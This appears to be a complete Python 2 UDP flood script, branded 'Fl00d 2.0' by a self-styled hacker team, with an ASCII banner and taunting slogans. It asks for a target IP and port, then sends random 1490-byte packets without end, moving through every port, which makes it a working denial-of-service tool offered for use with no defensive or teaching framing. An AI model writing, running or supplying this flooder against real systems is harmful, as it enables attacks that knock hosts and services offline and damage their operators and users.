import socket, os, random, time

B = '\033[1m'
R = '\033[31m'
N = '\033[0m'

from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year


sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
os.system("clear")
print B+"@@@@@@@@ @@@      @@@@@@@@   @@@@@@@@  @@@@@@@@"
print "@@@@@@@@ @@@     @@@@@@@@@@ @@@@@@@@@@ @@@   @@@@"
print "@@!      @@!     @@!   @@@@ @@!   @@@@ @@!     @@@"
print "!@!      !@!     !@!  @!@!@ !@!  @!@!@ !@!      @!@"
print "@!!!:!   @!!     @!@ @! !@! @!@ @! !@! @!@      !@!"
print "!!!!!:   !!!     !@!!!  !!! !@!!!  !!! !@!      !!!"
print "!!:      !!:     !!:!   !!! !!:!   !!! !!:      !!!"
print ":!:      :!:     :!:    !:! :!:    !:! :!:     !:!"
print ":::      ::::::: :::::::::: :::::::::: ;::    :::"
print ":::      :::::::  ::::::::   ::::::::  :::::::::"+N
print "["+B+""+R+"#"+N+"] "+B+""+R+"AndroSec1337 Cyber Team"+N+"   Fl00d 2.0 - "+B+""+R+"DedSecTL"+N
print "Teach them whos the boss - All Hail Hatsune Miku - Fl00d th3m"
print "#H4ck 4ll 7he 7h1ng - F1ght f0r Anime - K1ll th3m"
ip = raw_input('[$] T@rget 1P: ')
port = input('[$] P0rt: ')
os.system("clear")
print "Fl00d attack started on {0}.{1} | {2}-{3}-{4}".format(hour, minute, day, month, year)
time.sleep(3)
print
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
